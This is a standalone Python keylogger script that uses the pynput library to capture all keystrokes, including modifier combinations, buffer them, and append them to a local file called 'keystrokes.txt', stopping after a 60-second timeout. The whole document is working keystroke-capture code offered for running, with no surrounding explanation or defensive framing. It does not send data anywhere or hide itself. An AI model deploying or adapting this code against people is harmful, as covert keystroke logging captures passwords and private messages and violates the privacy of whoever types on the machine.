import time
from pynput import keyboard
from typing import Union

SPECIAL_KEYS = {
    "Key.space": " ", "Key.enter": "[ENTER]\n", "Key.backspace": "[BACKSPACE]",
    "Key.shift": "[SHIFT]", "Key.ctrl": "[CTRL]", "Key.alt": "[ALT]",
    "Key.tab": "[TAB]", "Key.esc": "[ESC]"
}

active_modifiers, keystroke_buffer = set(), []
BUFFER_SIZE, FLUSH_INTERVAL, TIMEOUT, start_time = 20, 5, 60, time.time()

def log_keystroke(key: Union[keyboard.Key, keyboard.KeyCode]):
    try:
        key_str = SPECIAL_KEYS.get(str(key).replace("'", ""), str(key).replace("'", ""))
        if active_modifiers:
            key_str = "+".join(sorted(active_modifiers)) + f"+{key_str}"
        keystroke_buffer.append(key_str)
        if len(keystroke_buffer) >= BUFFER_SIZE:
            flush_buffer()
    except Exception as e:
        print(f"Error logging key: {e}")

def on_press(key):
    try:
        key_str = str(key).replace("'", "")
        if key_str in {"Key.shift", "Key.ctrl", "Key.alt"}:
            active_modifiers.add(key_str)
        else:
            log_keystroke(key)
    except Exception as e:
        print(f"Error processing key press: {e}")

def on_release(key):
    try:
        active_modifiers.discard(str(key).replace("'", ""))
        if TIMEOUT and (time.time() - start_time) > TIMEOUT:
            flush_buffer()
            return False
    except Exception as e:
        print(f"Error processing key release: {e}")

def flush_buffer():
    if keystroke_buffer:
        with open("keystrokes.txt", "a") as f:
            f.write(" ".join(keystroke_buffer) + "\n")
        keystroke_buffer.clear()

def start_keylogger():
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        try:
            while not (TIMEOUT and (time.time() - start_time) > TIMEOUT):
                time.sleep(FLUSH_INTERVAL)
                flush_buffer()
        except KeyboardInterrupt:
            flush_buffer()
            print("\nKeylogger stopped.")

if __name__ == "__main__":
    start_keylogger()


